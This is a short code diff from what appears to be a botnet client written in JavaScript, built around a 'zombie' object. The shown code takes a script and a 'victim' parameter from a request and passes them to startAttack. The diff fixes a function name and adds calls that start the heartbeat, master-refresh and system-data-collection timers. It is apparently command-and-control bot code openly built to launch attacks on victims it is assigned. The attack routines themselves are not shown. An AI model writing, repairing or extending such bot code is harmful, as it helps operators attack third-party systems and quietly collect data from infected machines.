@@ -156,7 +156,7 @@ settingIntegrity.on('true', () => {
                             let script = resp.data
                             script.victim = req.params.victim
                             script.scriptdir = zombie.setupdata.scriptdir
-                            script.dictation = stitchSetupLine("dictation", script)
+                            script.dictation = stitchSetupLines("dictation", script)
                             console.log(script);
 
                             startAttack((script), req.params.victim, req.params.time)
@@ -278,33 +278,38 @@ settingIntegrity.on('true', () => {
             })
     }
 
-
+    
     var simpleHeartbeatTimer = function() {
         simpleHeartbeat()
         setTimeout(simpleHeartbeatTimer, zombie.config.simpleHeartbeatDelay);
     }
-
+    
     var complexHeartbeatTimer = function() {
         complexHeartbeat()
         setTimeout(complexHeartbeatTimer, zombie.config.complexHeartbeatDelay);
     }
-
+    
     var refreshMasterTimer = function() {
         refreshMaster()
         setTimeout(refreshMasterTimer, zombie.config.refreshTimerDelay);
     }
-
+    
     var siDataPlacementTimer = function() {
         dynamicDataPlacement()
         setTimeout(siDataPlacementTimer, zombie.config.siDataPlacementDelay);
     }
-
+    
     var detailedDynamicDataPlacementTimer = function() {
         detailedDynamicDataPlacement()
         setTimeout(detailedDynamicDataPlacementTimer, zombie.config.dynDataPlacementDelay);
     }
-
-
+    
+    simpleHeartbeatTimer()
+    complexHeartbeatTimer()
+    refreshMasterTimer()
+    siDataPlacementTimer()
+    detailedDynamicDataPlacementTimer()
+    
     function detailedDynamicDataPlacement () {
         if (!zombie.busy && zombie.config.allDynamicData) {
             si.getDynamicData(function (data) {
